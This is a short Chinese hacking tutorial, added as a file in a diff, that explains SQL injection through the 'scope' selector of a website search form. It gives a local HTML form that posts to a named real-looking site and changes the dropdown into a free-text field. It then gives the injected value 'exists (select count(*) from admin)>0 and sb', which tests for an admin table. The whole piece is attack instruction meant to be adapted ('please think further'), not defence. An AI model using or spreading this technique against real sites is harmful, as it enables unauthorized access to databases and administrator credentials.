@@ -1,0 +1,49 @@
+搜索匹配栏的注射
+当我们在对一个url进行注入的时候，我们可能会尝试get，post，cookies方法。
+不成功了还可以利用搜索框注射，那么大家有没有注意到一些搜索框上面的匹配栏呢，利用匹配栏我们同样可以进行注射！
+
+一般搜索匹配栏的表单是这样的：
+<form action="sb-team.asp" method="post" name=""> //action为数据提交地址 method为提交方式
+搜索关键字：<input type="text" name="">    //input标签，搜索关键字 这里的内容为下面的keyword
+范围： <select name="">                                //这里的内容为下面的select(选择)                       
+                    <option value="">内容</option>
+                    <option value="">标题</option>
+           </select>
+           <input type="submit" value="搜索">  //提交
+</from>
+
+那么他的查询语句猜想可能是：
+
+select data from tables where select(选择) like "%keyword%"  order by id desc
+
+我们对匹配栏进行注射，那么关键的语句就是：
+
+where select(选择) like "%keyword%" order by id desc
+
+了解以上之后我们可以自己本地构造一个html的提交页面：
+<html>
+<head>
+<title>本地注射提交 by str1ven</title>
+</head>
+<form action="http://www.sb-team.net/sb-team.asp" method="post" name=""> 
+搜索关键字：<input type="text" name="">    
+范围：        <input type="text" name="">   //这里将select变为text便于语句写入
+                 <input type="submit" value="搜索">  //提交
+</form>
+</html>
+
+之后我们在范围的栏写入注射语句：
+
+exists (select count(*) from admin)>0 and sb
+
+在搜索关键字栏填写sb 。
+
+那么我就会构成语句：
+
+where exists (select count(*) from admin)>0 and sb like %sb% （只要保持语句成立，sb可以换成别的）
+
+因为sb肯定like sb 所以语句成立。
+
+这样我们就通过匹配栏进行注射了。
+
+文章只是提供一个思路，还请大家发散~~~~~~{:4_114:} 
